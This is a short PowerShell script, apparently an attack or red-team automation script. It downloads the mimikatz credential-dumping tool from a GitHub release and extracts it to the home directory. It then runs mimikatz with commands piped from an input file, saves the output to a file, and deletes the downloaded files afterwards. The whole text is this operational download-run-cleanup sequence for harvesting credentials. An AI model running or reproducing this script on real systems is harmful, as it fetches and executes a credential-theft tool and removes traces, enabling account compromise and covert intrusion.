$mimikatz_zip_path = "$HOME/mimikatz.zip"
$mimikatz_path = "$HOME/mimikatz"
$client = new-object System.net.WebClient
$client.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_zip_path)
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path)
cd $mimikatz_path/x64
./mimikatz.exe > ./output_mimikatz < ./input_mimikatz
cd $HOME
rm -rf $mimikatz_zip_path $mimikatz_path
